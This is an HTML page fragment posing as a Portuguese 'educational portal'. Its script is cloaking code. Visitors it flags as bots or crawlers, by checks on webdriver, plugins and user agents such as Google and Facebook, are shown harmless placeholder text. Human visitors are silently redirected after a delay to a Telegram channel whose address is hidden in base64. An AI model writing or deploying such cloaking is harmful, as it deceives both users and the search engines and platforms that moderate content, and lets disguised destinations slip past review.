<body>

  <div id="white-content">
    <h1>Bem-vindo ao nosso portal educacional</h1>
    <p>Conteúdo informativo em fase de atualização.</p>
  </div>

  <script>
    const isBot = () => {
      const n = navigator;
      return (
        n.webdriver || 
        !n.languages || 
        n.languages.length === 0 ||
        !n.plugins || 
        n.plugins.length === 0 ||
        /bot|crawl|spider|facebook|google|Headless|PhantomJS/i.test(n.userAgent)
      );
    };

    const redirect = () => {
      const destino = atob("aHR0cHM6Ly90Lm1lL29jdWx0aW5ob3NmcmVl"); // https://t.me/ocultinhosfree
      window.location.href = destino;
    };

    if (isBot()) {
      // Mostra conteúdo institucional só para bots
      document.getElementById("white-content").style.display = "block";
    } else {
      // Redireciona humano real com delay
      setTimeout(redirect, 2500);
    }
  </script>
